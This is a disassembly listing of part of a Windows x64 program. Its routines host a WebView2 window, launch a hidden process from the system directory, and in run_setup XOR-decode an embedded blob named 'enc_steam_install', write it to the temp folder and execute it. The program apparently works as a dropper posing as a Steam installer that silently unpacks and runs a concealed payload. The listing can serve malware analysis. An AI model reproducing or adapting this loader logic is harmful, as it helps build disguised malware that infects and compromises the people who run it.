   1400032e0:	48 89 d7             	mov    %rdx,%rdi
   1400032e3:	48 89 cb             	mov    %rcx,%rbx
   1400032e6:	48 8d b4 24 f0 00 00 	lea    0xf0(%rsp),%rsi
   1400032ed:	00 
   1400032ee:	48 89 f1             	mov    %rsi,%rcx
   1400032f1:	ba 04 01 00 00       	mov    $0x104,%edx
   1400032f6:	ff 15 0c 47 07 00    	call   *0x7470c(%rip)        # 140077a08 <__imp_GetSystemDirectoryW>
   1400032fc:	48 8d 15 4f f6 06 00 	lea    0x6f64f(%rip),%rdx        # 140072952 <enc_runtimes_zip+0x34022>
   140003303:	48 89 f1             	mov    %rsi,%rcx
   140003306:	ff 15 84 47 07 00    	call   *0x74784(%rip)        # 140077a90 <__imp_lstrcatW>
   14000330c:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140003311:	48 8d 15 88 f6 06 00 	lea    0x6f688(%rip),%rdx        # 1400729a0 <enc_runtimes_zip+0x34070>
   140003318:	48 8d bc 24 00 03 00 	lea    0x300(%rsp),%rdi
   14000331f:	00 
   140003320:	48 89 f9             	mov    %rdi,%rcx
   140003323:	49 89 f0             	mov    %rsi,%r8
   140003326:	49 89 d9             	mov    %rbx,%r9
   140003329:	ff 15 89 48 07 00    	call   *0x74889(%rip)        # 140077bb8 <__imp_wsprintfW>
   14000332f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140003332:	0f 29 84 24 80 00 00 	movaps %xmm0,0x80(%rsp)
   140003339:	00 
   14000333a:	0f 29 84 24 d0 00 00 	movaps %xmm0,0xd0(%rsp)
   140003341:	00 
   140003342:	0f 29 84 24 c0 00 00 	movaps %xmm0,0xc0(%rsp)
   140003349:	00 
   14000334a:	0f 29 84 24 b0 00 00 	movaps %xmm0,0xb0(%rsp)
   140003351:	00 
   140003352:	0f 29 84 24 a0 00 00 	movaps %xmm0,0xa0(%rsp)
   140003359:	00 
   14000335a:	0f 29 84 24 90 00 00 	movaps %xmm0,0x90(%rsp)
   140003361:	00 
   140003362:	48 c7 84 24 e0 00 00 	movq   $0x0,0xe0(%rsp)
   140003369:	00 00 00 00 00 
   14000336e:	c7 84 24 80 00 00 00 	movl   $0x68,0x80(%rsp)
   140003375:	68 00 00 00 
   140003379:	0f 29 44 24 60       	movaps %xmm0,0x60(%rsp)
   14000337e:	48 c7 44 24 70 00 00 	movq   $0x0,0x70(%rsp)
   140003385:	00 00 
   140003387:	c7 84 24 bc 00 00 00 	movl   $0x1,0xbc(%rsp)
   14000338e:	01 00 00 00 
   140003392:	66 c7 84 24 c0 00 00 	movw   $0x0,0xc0(%rsp)
   140003399:	00 00 00 
   14000339c:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   1400033a1:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400033a6:	48 8d 84 24 80 00 00 	lea    0x80(%rsp),%rax
   1400033ad:	00 
   1400033ae:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   1400033b3:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400033b8:	c7 44 24 28 00 00 00 	movl   $0x8000000,0x28(%rsp)
   1400033bf:	08 
   1400033c0:	c7 44 24 20 00 00 00 	movl   $0x0,0x20(%rsp)
   1400033c7:	00 
   1400033c8:	31 db                	xor    %ebx,%ebx
   1400033ca:	48 89 f1             	mov    %rsi,%rcx
   1400033cd:	48 89 fa             	mov    %rdi,%rdx
   1400033d0:	45 31 c0             	xor    %r8d,%r8d
   1400033d3:	45 31 c9             	xor    %r9d,%r9d
   1400033d6:	ff 15 bc 45 07 00    	call   *0x745bc(%rip)        # 140077998 <__imp_CreateProcessW>
   1400033dc:	85 c0                	test   %eax,%eax
   1400033de:	74 4c                	je     14000342c <run_ps_extract+0x15c>
   1400033e0:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   1400033e5:	ba 60 ea 00 00       	mov    $0xea60,%edx
   1400033ea:	ff 15 88 46 07 00    	call   *0x74688(%rip)        # 140077a78 <__imp_WaitForSingleObject>
   1400033f0:	89 c6                	mov    %eax,%esi
   1400033f2:	c7 44 24 5c 01 00 00 	movl   $0x1,0x5c(%rsp)
   1400033f9:	00 
   1400033fa:	85 c0                	test   %eax,%eax
   1400033fc:	75 10                	jne    14000340e <run_ps_extract+0x13e>
   1400033fe:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003403:	48 8d 54 24 5c       	lea    0x5c(%rsp),%rdx
   140003408:	ff 15 ba 45 07 00    	call   *0x745ba(%rip)        # 1400779c8 <__imp_GetExitCodeProcess>
   14000340e:	48 8b 4c 24 60       	mov    0x60(%rsp),%rcx
   140003413:	48 8b 3d 66 45 07 00 	mov    0x74566(%rip),%rdi        # 140077980 <__imp_CloseHandle>
   14000341a:	ff d7                	call   *%rdi
   14000341c:	48 8b 4c 24 68       	mov    0x68(%rsp),%rcx
   140003421:	ff d7                	call   *%rdi
   140003423:	31 db                	xor    %ebx,%ebx
   140003425:	0b 74 24 5c          	or     0x5c(%rsp),%esi
   140003429:	0f 94 c3             	sete   %bl
   14000342c:	89 d8                	mov    %ebx,%eax
   14000342e:	48 81 c4 00 13 00 00 	add    $0x1300,%rsp
   140003435:	5b                   	pop    %rbx
   140003436:	5f                   	pop    %rdi
   140003437:	5e                   	pop    %rsi
   140003438:	c3                   	ret
   140003439:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000140003440 <WVProc>:
   140003440:	56                   	push   %rsi
   140003441:	57                   	push   %rdi
   140003442:	53                   	push   %rbx
   140003443:	48 81 ec 30 04 00 00 	sub    $0x430,%rsp
   14000344a:	83 fa 04             	cmp    $0x4,%edx
   14000344d:	0f 8f b1 00 00 00    	jg     140003504 <WVProc+0xc4>
   140003453:	83 fa 01             	cmp    $0x1,%edx
   140003456:	0f 84 5c 01 00 00    	je     1400035b8 <WVProc+0x178>
   14000345c:	83 fa 02             	cmp    $0x2,%edx
   14000345f:	0f 85 42 01 00 00    	jne    1400035a7 <WVProc+0x167>
   140003465:	ba 02 00 00 00       	mov    $0x2,%edx
   14000346a:	ff 15 b8 46 07 00    	call   *0x746b8(%rip)        # 140077b28 <__imp_KillTimer>
   140003470:	48 8b 0d 01 6d 07 00 	mov    0x76d01(%rip),%rcx        # 14007a178 <g_wv+0x18>
   140003477:	48 85 c9             	test   %rcx,%rcx
   14000347a:	74 21                	je     14000349d <WVProc+0x5d>
   14000347c:	48 8b 01             	mov    (%rcx),%rax
   14000347f:	ff 90 c0 00 00 00    	call   *0xc0(%rax)
   140003485:	48 8b 0d ec 6c 07 00 	mov    0x76cec(%rip),%rcx        # 14007a178 <g_wv+0x18>
   14000348c:	48 8b 01             	mov    (%rcx),%rax
   14000348f:	ff 50 10             	call   *0x10(%rax)
   140003492:	48 c7 05 db 6c 07 00 	movq   $0x0,0x76cdb(%rip)        # 14007a178 <g_wv+0x18>
   140003499:	00 00 00 00 
   14000349d:	48 8b 0d dc 6c 07 00 	mov    0x76cdc(%rip),%rcx        # 14007a180 <g_wv+0x20>
   1400034a4:	48 85 c9             	test   %rcx,%rcx
   1400034a7:	74 11                	je     1400034ba <WVProc+0x7a>
   1400034a9:	48 8b 01             	mov    (%rcx),%rax
   1400034ac:	ff 50 10             	call   *0x10(%rax)
   1400034af:	48 c7 05 c6 6c 07 00 	movq   $0x0,0x76cc6(%rip)        # 14007a180 <g_wv+0x20>
   1400034b6:	00 00 00 00 
   1400034ba:	48 8b 0d af 6c 07 00 	mov    0x76caf(%rip),%rcx        # 14007a170 <g_wv+0x10>
   1400034c1:	48 85 c9             	test   %rcx,%rcx
   1400034c4:	74 11                	je     1400034d7 <WVProc+0x97>
   1400034c6:	48 8b 01             	mov    (%rcx),%rax
   1400034c9:	ff 50 10             	call   *0x10(%rax)
   1400034cc:	48 c7 05 99 6c 07 00 	movq   $0x0,0x76c99(%rip)        # 14007a170 <g_wv+0x10>
   1400034d3:	00 00 00 00 
   1400034d7:	48 8b 0d b2 6c 07 00 	mov    0x76cb2(%rip),%rcx        # 14007a190 <g_wv+0x30>
   1400034de:	48 85 c9             	test   %rcx,%rcx
   1400034e1:	74 11                	je     1400034f4 <WVProc+0xb4>
   1400034e3:	ff 15 cf 44 07 00    	call   *0x744cf(%rip)        # 1400779b8 <__imp_FreeLibrary>
   1400034e9:	48 c7 05 9c 6c 07 00 	movq   $0x0,0x76c9c(%rip)        # 14007a190 <g_wv+0x30>
   1400034f0:	00 00 00 00 
   1400034f4:	48 c7 05 61 6c 07 00 	movq   $0x0,0x76c61(%rip)        # 14007a160 <g_wv>
   1400034fb:	00 00 00 00 
   1400034ff:	e9 5b 02 00 00       	jmp    14000375f <WVProc+0x31f>
   140003504:	83 fa 05             	cmp    $0x5,%edx
   140003507:	0f 84 e7 01 00 00    	je     1400036f4 <WVProc+0x2b4>
   14000350d:	81 fa 13 01 00 00    	cmp    $0x113,%edx
   140003513:	0f 85 8e 00 00 00    	jne    1400035a7 <WVProc+0x167>
   140003519:	49 83 f8 02          	cmp    $0x2,%r8
   14000351d:	0f 85 3c 02 00 00    	jne    14000375f <WVProc+0x31f>
   140003523:	48 8b 05 56 6c 07 00 	mov    0x76c56(%rip),%rax        # 14007a180 <g_wv+0x20>
   14000352a:	48 85 c0             	test   %rax,%rax
   14000352d:	0f 84 2c 02 00 00    	je     14000375f <WVProc+0x31f>
   140003533:	83 3d 4e 6c 07 00 00 	cmpl   $0x0,0x76c4e(%rip)        # 14007a188 <g_wv+0x28>
   14000353a:	0f 85 1f 02 00 00    	jne    14000375f <WVProc+0x31f>
   140003540:	48 89 ce             	mov    %rcx,%rsi
   140003543:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000354a:	00 00 
   14000354c:	4c 8b 00             	mov    (%rax),%r8
   14000354f:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003554:	48 89 c1             	mov    %rax,%rcx
   140003557:	41 ff 50 20          	call   *0x20(%r8)
   14000355b:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   140003560:	48 85 c9             	test   %rcx,%rcx
   140003563:	0f 84 f6 01 00 00    	je     14000375f <WVProc+0x31f>
   140003569:	48 8d 15 28 f7 06 00 	lea    0x6f728(%rip),%rdx        # 140072c98 <enc_runtimes_zip+0x34368>
   140003570:	e8 5b 20 00 00       	call   1400055d0 <wcsstr>
   140003575:	48 85 c0             	test   %rax,%rax
   140003578:	74 1d                	je     140003597 <WVProc+0x157>
   14000357a:	c7 05 04 6c 07 00 01 	movl   $0x1,0x76c04(%rip)        # 14007a188 <g_wv+0x28>
   140003581:	00 00 00 
   140003584:	e8 e7 01 00 00       	call   140003770 <run_setup>
   140003589:	ba 02 00 00 00       	mov    $0x2,%edx
   14000358e:	48 89 f1             	mov    %rsi,%rcx
   140003591:	ff 15 91 45 07 00    	call   *0x74591(%rip)        # 140077b28 <__imp_KillTimer>
   140003597:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   14000359c:	ff 15 b6 43 07 00    	call   *0x743b6(%rip)        # 140077958 <__imp_CoTaskMemFree>
   1400035a2:	e9 b8 01 00 00       	jmp    14000375f <WVProc+0x31f>
   1400035a7:	48 81 c4 30 04 00 00 	add    $0x430,%rsp
   1400035ae:	5b                   	pop    %rbx
   1400035af:	5f                   	pop    %rdi
   1400035b0:	5e                   	pop    %rsi
   1400035b1:	48 ff 25 f8 44 07 00 	rex.W jmp *0x744f8(%rip)        # 140077ab0 <__imp_DefWindowProcW>
   1400035b8:	48 89 cb             	mov    %rcx,%rbx
   1400035bb:	48 89 0d 9e 6b 07 00 	mov    %rcx,0x76b9e(%rip)        # 14007a160 <g_wv>
   1400035c2:	48 8d 0d cf 6b 07 00 	lea    0x76bcf(%rip),%rcx        # 14007a198 <g_wv+0x38>
   1400035c9:	ff 15 71 44 07 00    	call   *0x74471(%rip)        # 140077a40 <__imp_LoadLibraryW>
   1400035cf:	48 89 05 ba 6b 07 00 	mov    %rax,0x76bba(%rip)        # 14007a190 <g_wv+0x30>
   1400035d6:	48 85 c0             	test   %rax,%rax
   1400035d9:	0f 84 51 01 00 00    	je     140003730 <WVProc+0x2f0>
   1400035df:	48 8d 15 fc f4 06 00 	lea    0x6f4fc(%rip),%rdx        # 140072ae2 <enc_runtimes_zip+0x341b2>
   1400035e6:	48 89 c1             	mov    %rax,%rcx
   1400035e9:	ff 15 01 44 07 00    	call   *0x74401(%rip)        # 1400779f0 <__imp_GetProcAddress>
   1400035ef:	48 85 c0             	test   %rax,%rax
   1400035f2:	0f 84 41 01 00 00    	je     140003739 <WVProc+0x2f9>
   1400035f8:	48 89 c6             	mov    %rax,%rsi
   1400035fb:	48 8d 0d 26 f5 06 00 	lea    0x6f526(%rip),%rcx        # 140072b28 <enc_runtimes_zip+0x341f8>
   140003602:	48 8d 15 6b f5 06 00 	lea    0x6f56b(%rip),%rdx        # 140072b74 <enc_runtimes_zip+0x34244>
   140003609:	ff 15 39 44 07 00    	call   *0x74439(%rip)        # 140077a48 <__imp_SetEnvironmentVariableW>
   14000360f:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   140003614:	b9 04 01 00 00       	mov    $0x104,%ecx
   140003619:	48 89 fa             	mov    %rdi,%rdx
   14000361c:	ff 15 ee 43 07 00    	call   *0x743ee(%rip)        # 140077a10 <__imp_GetTempPathW>
   140003622:	48 8d 15 d9 f5 06 00 	lea    0x6f5d9(%rip),%rdx        # 140072c02 <enc_runtimes_zip+0x342d2>
   140003629:	48 89 f9             	mov    %rdi,%rcx
   14000362c:	ff 15 5e 44 07 00    	call   *0x7445e(%rip)        # 140077a90 <__imp_lstrcatW>
   140003632:	48 89 f9             	mov    %rdi,%rcx
   140003635:	31 d2                	xor    %edx,%edx
   140003637:	ff 15 4b 43 07 00    	call   *0x7434b(%rip)        # 140077988 <__imp_CreateDirectoryW>
   14000363d:	85 c0                	test   %eax,%eax
   14000363f:	75 43                	jne    140003684 <WVProc+0x244>
   140003641:	ff 15 99 43 07 00    	call   *0x74399(%rip)        # 1400779e0 <__imp_GetLastError>
   140003647:	3d b7 00 00 00       	cmp    $0xb7,%eax
   14000364c:	74 36                	je     140003684 <WVProc+0x244>
   14000364e:	48 8d 0d c7 f5 06 00 	lea    0x6f5c7(%rip),%rcx        # 140072c1c <enc_runtimes_zip+0x342ec>
   140003655:	48 8d 7c 24 20       	lea    0x20(%rsp),%rdi
   14000365a:	48 89 fa             	mov    %rdi,%rdx
   14000365d:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140003663:	ff 15 57 43 07 00    	call   *0x74357(%rip)        # 1400779c0 <__imp_GetEnvironmentVariableW>
   140003669:	48 8d 15 c6 f5 06 00 	lea    0x6f5c6(%rip),%rdx        # 140072c36 <enc_runtimes_zip+0x34306>
   140003670:	48 89 f9             	mov    %rdi,%rcx
   140003673:	ff 15 17 44 07 00    	call   *0x74417(%rip)        # 140077a90 <__imp_lstrcatW>
   140003679:	48 89 f9             	mov    %rdi,%rcx
   14000367c:	31 d2                	xor    %edx,%edx
   14000367e:	ff 15 04 43 07 00    	call   *0x74304(%rip)        # 140077988 <__imp_CreateDirectoryW>
   140003684:	ff 15 6e 43 07 00    	call   *0x7436e(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   14000368a:	41 b8 18 00 00 00    	mov    $0x18,%r8d
   140003690:	48 89 c1             	mov    %rax,%rcx
   140003693:	ba 08 00 00 00       	mov    $0x8,%edx
   140003698:	ff 15 82 43 07 00    	call   *0x74382(%rip)        # 140077a20 <__imp_HeapAlloc>
   14000369e:	48 8d 0d 1b f6 06 00 	lea    0x6f61b(%rip),%rcx        # 140072cc0 <s_ehVtbl>
   1400036a5:	48 89 08             	mov    %rcx,(%rax)
   1400036a8:	c7 40 08 01 00 00 00 	movl   $0x1,0x8(%rax)
   1400036af:	48 89 58 10          	mov    %rbx,0x10(%rax)
   1400036b3:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400036b8:	31 c9                	xor    %ecx,%ecx
   1400036ba:	45 31 c0             	xor    %r8d,%r8d
   1400036bd:	49 89 c1             	mov    %rax,%r9
   1400036c0:	ff d6                	call   *%rsi
   1400036c2:	85 c0                	test   %eax,%eax
   1400036c4:	0f 89 95 00 00 00    	jns    14000375f <WVProc+0x31f>
   1400036ca:	48 8d 15 81 f5 06 00 	lea    0x6f581(%rip),%rdx        # 140072c52 <enc_runtimes_zip+0x34322>
   1400036d1:	48 8d b4 24 30 02 00 	lea    0x230(%rsp),%rsi
   1400036d8:	00 
   1400036d9:	48 89 f1             	mov    %rsi,%rcx
   1400036dc:	41 89 c0             	mov    %eax,%r8d
   1400036df:	ff 15 d3 44 07 00    	call   *0x744d3(%rip)        # 140077bb8 <__imp_wsprintfW>
   1400036e5:	4c 8d 05 98 f5 06 00 	lea    0x6f598(%rip),%r8        # 140072c84 <enc_runtimes_zip+0x34354>
   1400036ec:	48 89 d9             	mov    %rbx,%rcx
   1400036ef:	48 89 f2             	mov    %rsi,%rdx
   1400036f2:	eb 56                	jmp    14000374a <WVProc+0x30a>
   1400036f4:	48 83 3d 7c 6a 07 00 	cmpq   $0x0,0x76a7c(%rip)        # 14007a178 <g_wv+0x18>
   1400036fb:	00 
   1400036fc:	74 61                	je     14000375f <WVProc+0x31f>
   1400036fe:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140003703:	ff 15 df 43 07 00    	call   *0x743df(%rip)        # 140077ae8 <__imp_GetClientRect>
   140003709:	48 8b 0d 68 6a 07 00 	mov    0x76a68(%rip),%rcx        # 14007a178 <g_wv+0x18>
   140003710:	48 8b 01             	mov    (%rcx),%rax
   140003713:	48 8b 40 30          	mov    0x30(%rax),%rax
   140003717:	0f 10 44 24 20       	movups 0x20(%rsp),%xmm0
   14000371c:	0f 29 84 24 30 02 00 	movaps %xmm0,0x230(%rsp)
   140003723:	00 
   140003724:	48 8d 94 24 30 02 00 	lea    0x230(%rsp),%rdx
   14000372b:	00 
   14000372c:	ff d0                	call   *%rax
   14000372e:	eb 2f                	jmp    14000375f <WVProc+0x31f>
   140003730:	48 8d 15 65 f3 06 00 	lea    0x6f365(%rip),%rdx        # 140072a9c <enc_runtimes_zip+0x3416c>
   140003737:	eb 07                	jmp    140003740 <WVProc+0x300>
   140003739:	48 8d 15 cc f3 06 00 	lea    0x6f3cc(%rip),%rdx        # 140072b0c <enc_runtimes_zip+0x341dc>
   140003740:	4c 8d 05 8f f3 06 00 	lea    0x6f38f(%rip),%r8        # 140072ad6 <enc_runtimes_zip+0x341a6>
   140003747:	48 89 d9             	mov    %rbx,%rcx
   14000374a:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   140003750:	ff 15 ea 43 07 00    	call   *0x743ea(%rip)        # 140077b40 <__imp_MessageBoxW>
   140003756:	48 89 d9             	mov    %rbx,%rcx
   140003759:	ff 15 61 43 07 00    	call   *0x74361(%rip)        # 140077ac0 <__imp_DestroyWindow>
   14000375f:	31 c0                	xor    %eax,%eax
   140003761:	48 81 c4 30 04 00 00 	add    $0x430,%rsp
   140003768:	5b                   	pop    %rbx
   140003769:	5f                   	pop    %rdi
   14000376a:	5e                   	pop    %rsi
   14000376b:	c3                   	ret
   14000376c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140003770 <run_setup>:
   140003770:	56                   	push   %rsi
   140003771:	57                   	push   %rdi
   140003772:	48 81 ec 58 04 00 00 	sub    $0x458,%rsp
   140003779:	48 8d b4 24 50 02 00 	lea    0x250(%rsp),%rsi
   140003780:	00 
   140003781:	b9 04 01 00 00       	mov    $0x104,%ecx
   140003786:	48 89 f2             	mov    %rsi,%rdx
   140003789:	ff 15 81 42 07 00    	call   *0x74281(%rip)        # 140077a10 <__imp_GetTempPathW>
   14000378f:	48 8d 15 6a fd 06 00 	lea    0x6fd6a(%rip),%rdx        # 140073500 <IID_NavDone+0x10>
   140003796:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000379b:	49 89 f0             	mov    %rsi,%r8
   14000379e:	ff 15 14 44 07 00    	call   *0x74414(%rip)        # 140077bb8 <__imp_wsprintfW>
   1400037a4:	ff 15 4e 42 07 00    	call   *0x7424e(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   1400037aa:	41 b8 00 20 00 00    	mov    $0x2000,%r8d
   1400037b0:	48 89 c1             	mov    %rax,%rcx
   1400037b3:	31 d2                	xor    %edx,%edx
   1400037b5:	ff 15 65 42 07 00    	call   *0x74265(%rip)        # 140077a20 <__imp_HeapAlloc>
   1400037bb:	48 85 c0             	test   %rax,%rax
   1400037be:	0f 84 01 01 00 00    	je     1400038c5 <run_setup+0x155>
   1400037c4:	48 89 c6             	mov    %rax,%rsi
   1400037c7:	48 8d 15 52 fd 06 00 	lea    0x6fd52(%rip),%rdx        # 140073520 <enc_steam_install>
   1400037ce:	41 b8 00 20 00 00    	mov    $0x2000,%r8d
   1400037d4:	48 89 c1             	mov    %rax,%rcx
   1400037d7:	e8 c4 1d 00 00       	call   1400055a0 <memcpy>
   1400037dc:	b8 01 00 00 00       	mov    $0x1,%eax
   1400037e1:	48 8d 0d 28 40 01 00 	lea    0x14028(%rip),%rcx        # 140017810 <XOR_KEY>
   1400037e8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400037ef:	00 
   1400037f0:	8d 50 ff             	lea    -0x1(%rax),%edx
   1400037f3:	83 e2 0e             	and    $0xe,%edx
   1400037f6:	0f b6 14 0a          	movzbl (%rdx,%rcx,1),%edx
   1400037fa:	30 54 06 ff          	xor    %dl,-0x1(%rsi,%rax,1)
   1400037fe:	89 c2                	mov    %eax,%edx
   140003800:	83 e2 0f             	and    $0xf,%edx
   140003803:	0f b6 14 0a          	movzbl (%rdx,%rcx,1),%edx
   140003807:	30 14 06             	xor    %dl,(%rsi,%rax,1)
   14000380a:	48 83 c0 02          	add    $0x2,%rax
   14000380e:	48 3d 01 20 00 00    	cmp    $0x2001,%rax
   140003814:	75 da                	jne    1400037f0 <run_setup+0x80>
   140003816:	48 c7 44 24 30 00 00 	movq   $0x0,0x30(%rsp)
   14000381d:	00 00 
   14000381f:	c7 44 24 28 80 00 00 	movl   $0x80,0x28(%rsp)
   140003826:	00 
   140003827:	c7 44 24 20 02 00 00 	movl   $0x2,0x20(%rsp)
   14000382e:	00 
   14000382f:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003834:	ba 00 00 00 40       	mov    $0x40000000,%edx
   140003839:	45 31 c0             	xor    %r8d,%r8d
   14000383c:	45 31 c9             	xor    %r9d,%r9d
   14000383f:	ff 15 4b 41 07 00    	call   *0x7414b(%rip)        # 140077990 <__imp_CreateFileW>
   140003845:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   140003849:	74 66                	je     1400038b1 <run_setup+0x141>
   14000384b:	48 89 c7             	mov    %rax,%rdi
   14000384e:	c7 44 24 3c 00 00 00 	movl   $0x0,0x3c(%rsp)
   140003855:	00 
   140003856:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   14000385d:	00 00 
   14000385f:	4c 8d 4c 24 3c       	lea    0x3c(%rsp),%r9
   140003864:	48 89 c1             	mov    %rax,%rcx
   140003867:	48 89 f2             	mov    %rsi,%rdx
   14000386a:	41 b8 00 20 00 00    	mov    $0x2000,%r8d
   140003870:	ff 15 0a 42 07 00    	call   *0x7420a(%rip)        # 140077a80 <__imp_WriteFile>
   140003876:	48 89 f9             	mov    %rdi,%rcx
   140003879:	ff 15 01 41 07 00    	call   *0x74101(%rip)        # 140077980 <__imp_CloseHandle>
   14000387f:	81 7c 24 3c 00 20 00 	cmpl   $0x2000,0x3c(%rsp)
   140003886:	00 
   140003887:	75 28                	jne    1400038b1 <run_setup+0x141>
   140003889:	c7 44 24 28 01 00 00 	movl   $0x1,0x28(%rsp)
   140003890:	00 
   140003891:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   140003898:	00 00 
   14000389a:	48 8d 15 7f 1c 07 00 	lea    0x71c7f(%rip),%rdx        # 140075520 <enc_steam_install+0x2000>
   1400038a1:	4c 8d 44 24 40       	lea    0x40(%rsp),%r8
   1400038a6:	31 c9                	xor    %ecx,%ecx
   1400038a8:	45 31 c9             	xor    %r9d,%r9d
   1400038ab:	ff 15 bf 40 07 00    	call   *0x740bf(%rip)        # 140077970 <__imp_ShellExecuteW>
   1400038b1:	ff 15 41 41 07 00    	call   *0x74141(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   1400038b7:	48 89 c1             	mov    %rax,%rcx
   1400038ba:	31 d2                	xor    %edx,%edx
   1400038bc:	49 89 f0             	mov    %rsi,%r8
   1400038bf:	ff 15 63 41 07 00    	call   *0x74163(%rip)        # 140077a28 <__imp_HeapFree>
   1400038c5:	90                   	nop
   1400038c6:	48 81 c4 58 04 00 00 	add    $0x458,%rsp
   1400038cd:	5f                   	pop    %rdi
   1400038ce:	5e                   	pop    %rsi
   1400038cf:	c3                   	ret

00000001400038d0 <EH_QI>:
   1400038d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400038d4:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   1400038d8:	48 8b 05 51 1c 07 00 	mov    0x71c51(%rip),%rax        # 140075530 <.refptr.IID_IUnknown>
   1400038df:	f3 0f 6f 08          	movdqu (%rax),%xmm1
   1400038e3:	66 0f 74 c8          	pcmpeqb %xmm0,%xmm1
   1400038e7:	66 0f d7 c1          	pmovmskb %xmm1,%eax
   1400038eb:	3d ff ff 00 00       	cmp    $0xffff,%eax
   1400038f0:	74 28                	je     14000391a <EH_QI+0x4a>
   1400038f2:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   1400038f6:	66 0f 74 05 92 28 00 	pcmpeqb 0x2892(%rip),%xmm0        # 140006190 <.refptr._newmode+0x100>
   1400038fd:	00 
   1400038fe:	66 0f d7 c0          	pmovmskb %xmm0,%eax
   140003902:	3d ff ff 00 00       	cmp    $0xffff,%eax
   140003907:	74 11                	je     14000391a <EH_QI+0x4a>
   140003909:	49 c7 00 00 00 00 00 	movq   $0x0,(%r8)
   140003910:	b8 02 40 00 80       	mov    $0x80004002,%eax
   140003915:	48 83 c4 28          	add    $0x28,%rsp
   140003919:	c3                   	ret
   14000391a:	49 89 08             	mov    %rcx,(%r8)
   14000391d:	48 8b 01             	mov    (%rcx),%rax
   140003920:	ff 50 08             	call   *0x8(%rax)
   140003923:	31 c0                	xor    %eax,%eax
   140003925:	48 83 c4 28          	add    $0x28,%rsp
   140003929:	c3                   	ret
   14000392a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000140003930 <EH_AR>:
   140003930:	b8 01 00 00 00       	mov    $0x1,%eax
   140003935:	f0 0f c1 41 08       	lock xadd %eax,0x8(%rcx)
   14000393a:	ff c0                	inc    %eax
   14000393c:	c3                   	ret
   14000393d:	0f 1f 00             	nopl   (%rax)

0000000140003940 <EH_RE>:
   140003940:	56                   	push   %rsi
   140003941:	57                   	push   %rdi
   140003942:	48 83 ec 28          	sub    $0x28,%rsp
   140003946:	be ff ff ff ff       	mov    $0xffffffff,%esi
   14000394b:	f0 0f c1 71 08       	lock xadd %esi,0x8(%rcx)
   140003950:	ff ce                	dec    %esi
   140003952:	75 17                	jne    14000396b <EH_RE+0x2b>
   140003954:	48 89 cf             	mov    %rcx,%rdi
   140003957:	ff 15 9b 40 07 00    	call   *0x7409b(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   14000395d:	48 89 c1             	mov    %rax,%rcx
   140003960:	31 d2                	xor    %edx,%edx
   140003962:	49 89 f8             	mov    %rdi,%r8
   140003965:	ff 15 bd 40 07 00    	call   *0x740bd(%rip)        # 140077a28 <__imp_HeapFree>
   14000396b:	89 f0                	mov    %esi,%eax
   14000396d:	48 83 c4 28          	add    $0x28,%rsp
   140003971:	5f                   	pop    %rdi
   140003972:	5e                   	pop    %rsi
   140003973:	c3                   	ret
   140003974:	66 66 66 2e 0f 1f 84 	data16 data16 cs nopw 0x0(%rax,%rax,1)
   14000397b:	00 00 00 00 00 

0000000140003980 <EH_Inv>:
   140003980:	56                   	push   %rsi
   140003981:	57                   	push   %rdi
   140003982:	53                   	push   %rbx
   140003983:	48 81 ec 20 01 00 00 	sub    $0x120,%rsp
   14000398a:	48 89 ce             	mov    %rcx,%rsi
   14000398d:	85 d2                	test   %edx,%edx
   14000398f:	0f 99 c0             	setns  %al
   140003992:	4d 85 c0             	test   %r8,%r8
   140003995:	0f 95 c1             	setne  %cl
   140003998:	84 c8                	test   %cl,%al
   14000399a:	74 5b                	je     1400039f7 <EH_Inv+0x77>
   14000399c:	4c 89 c7             	mov    %r8,%rdi
   14000399f:	4c 89 05 ca 67 07 00 	mov    %r8,0x767ca(%rip)        # 14007a170 <g_wv+0x10>
   1400039a6:	49 8b 00             	mov    (%r8),%rax
   1400039a9:	4c 89 c1             	mov    %r8,%rcx
   1400039ac:	ff 50 08             	call   *0x8(%rax)
   1400039af:	48 8b 5e 10          	mov    0x10(%rsi),%rbx
   1400039b3:	ff 15 3f 40 07 00    	call   *0x7403f(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   1400039b9:	41 b8 18 00 00 00    	mov    $0x18,%r8d
   1400039bf:	48 89 c1             	mov    %rax,%rcx
   1400039c2:	ba 08 00 00 00       	mov    $0x8,%edx
   1400039c7:	ff 15 53 40 07 00    	call   *0x74053(%rip)        # 140077a20 <__imp_HeapAlloc>
   1400039cd:	48 8d 0d 54 f3 06 00 	lea    0x6f354(%rip),%rcx        # 140072d28 <s_chVtbl>
   1400039d4:	48 89 08             	mov    %rcx,(%rax)
   1400039d7:	c7 40 08 01 00 00 00 	movl   $0x1,0x8(%rax)
